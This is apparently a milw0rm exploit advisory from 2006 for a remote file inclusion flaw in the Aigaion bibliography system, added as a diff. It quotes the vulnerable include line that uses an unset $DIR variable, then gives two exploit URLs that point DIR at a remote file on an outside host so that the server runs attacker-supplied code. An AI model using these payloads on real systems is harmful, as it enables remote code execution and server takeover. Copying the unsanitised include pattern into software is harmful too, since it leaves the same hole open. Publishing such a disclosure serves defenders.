@@ -1,0 +1,22 @@
+Software:Web based bibliography management system
+Download link: http://sourceforge.net/projects/aigaion/
+script:_basicfunctions.php
+author: navairum
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+The script _basicfunctions.php does not specify a value for the $DIR variable before including it.
+Vulnerable code:
+
+//if this script is not called from within one of the base pages, redirect to frontpage
+require_once($DIR."checkBase.php");
+
+/* This function leads the browser to the given location */
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Exploit:
+http://site/[PATH]/_basicfunctions.php?DIR=http://site/uhoh.txt?
+http://site/path/pageactionauthor.php?DIR=http://site/uhoh.txt?
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# milw0rm.com [2006-11-14]
